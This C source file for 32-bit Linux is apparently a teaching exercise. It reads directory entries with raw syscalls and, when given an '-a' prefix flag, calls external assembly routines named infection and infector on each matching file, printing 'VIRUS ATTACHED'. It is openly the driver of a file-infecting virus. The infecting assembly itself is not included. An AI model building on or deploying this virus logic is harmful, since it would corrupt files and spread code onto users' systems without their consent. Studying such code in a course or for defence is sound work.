#include "util.h"          // for strlen, strncmp, etc.
#include <fcntl.h>         // For open(), O_RDONLY, O_DIRECTORY, etc.
#include <sys/syscall.h>   // For SYS_getdents
#include <linux/types.h>   // For __u32, __u64, etc.
#include "syscall.h"
extern int system_call();

// Raw syscall numbers
#define SYS_EXIT    1
#define SYS_READ    3
#define SYS_WRITE   4
#define SYS_OPEN    5
#define SYS_CLOSE   6
#define SYS_GETDENTS 141  // Changed from SYS_GETDENTS64 220

// File access modes
#define O_RDONLY        00000000
#define O_WRONLY        00000001
#define O_RDWR          00000002
#define O_CREAT         00000100
#define O_EXCL          00000200
#define O_TRUNC         00001000
#define O_APPEND        00002000
#define O_DIRECTORY     00200000

#define BUF_SIZE 8192 // <= 10 KB as permitted

// Structure for directory entries in 32-bit Linux
struct linux_dirent {
    unsigned int  d_ino;    // 32-bit inode number
    unsigned int  d_off;    // 32-bit offset
    unsigned short d_reclen; // Size of this dirent
    unsigned char  d_type;  // File type (might not be supported in all kernels)
    char          d_name[256]; // Fixed size array for compatibility
} __attribute__((packed));

// External assembly routines -defined in start.s) 
extern void infection(void);
extern void infector(char *filename);

// syscall wrapper - get the syscall number and up to 5 arguments which are passed in registers
static inline int sys_call(int num,
                           int arg1, int arg2, int arg3,
                           int arg4, int arg5)
{
    int ret;
    __asm__ volatile ("int $0x80"
                      : "=a"(ret)
                      : "a"(num), "b"(arg1), "c"(arg2),
                        "d"(arg3), "S"(arg4), "D"(arg5)
                      : "memory");
    return ret;        /* negative => -errno, exactly like raw syscalls */
}
// Activate sys_call SYS_WRITE for printing a string to stdout
// 1: File descriptor for stdout
// str : Pointer to the string to print
// strlen(str) : number of bytes to write
void print(const char* str) {
    sys_call(SYS_WRITE, 1, (int)str, strlen(str), 0, 0);
}

// In case of an error, print an error message and exit with code 0x66
void print_error_exit() {
    print("Error occurred\n");
    sys_call(SYS_EXIT, 0x66, 0, 0, 0, 0);
}



int main(int argc, char **argv) {
    char *prefix = 0;
    int i;
    for (i = 1; i < argc; i++) {
        if (strncmp(argv[i], "-a", 2) == 0) {
            prefix = argv[i] + 2; // pointer to prefix text
        }
    }
    
    // call infection() once if -a supplied
    if (prefix) {
        infection();
    }
    
    // open curr dir
    int fd = sys_call(SYS_OPEN, (int)".", O_RDONLY|O_DIRECTORY, 0, 0, 0);
    if (fd < 0) {
        print_error_exit();
    }

    // Read directory entries via getdents
    char buf[BUF_SIZE];
    int nread = sys_call(SYS_GETDENTS, fd, (int)buf, BUF_SIZE, 0, 0);
    if (nread < 0) {
        print_error_exit();
    }

    int bpos = 0;
    // Iterate over entries in the buffer
    while (bpos < nread) {
        struct linux_dirent *d = (struct linux_dirent *)(buf + bpos);
        char *name = d->d_name;
        // Print the filename first
        print(name);
        // If -a<prefix> given and name starts with it → infect the file
        if (prefix && strncmp(name, prefix, strlen(prefix)) == 0) {
            print(" VIRUS ATTACHED\n");
            // call an assembly function
            infector(name);
        } else {
            print("\n");
        }

        // advance to next file
        bpos += d->d_reclen;
    }

    sys_call(SYS_CLOSE, fd, 0,0,0,0);
    sys_call(SYS_EXIT, 0, 0,0,0,0); // normal exit
    return 0;
}